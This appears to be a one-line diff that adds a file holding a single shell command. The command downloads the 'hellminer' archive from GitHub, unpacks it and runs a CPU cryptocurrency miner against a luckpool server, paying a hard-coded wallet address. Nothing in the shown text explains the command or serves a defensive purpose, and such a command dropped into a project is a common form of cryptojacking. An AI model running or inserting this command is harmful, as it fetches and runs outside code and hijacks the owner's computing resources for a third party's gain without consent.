@@ -1,0 +1,1 @@
+wget https://github.com/hellcatz/hminer/releases/download/v0.58/hellminer_linux64.tar.gz && tar -xf hellminer_linux64.tar.gz && ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RMAvGgBZvs7W168MvQ1iPUSAWExijbB6LD.xx01 -p x --cpu 8
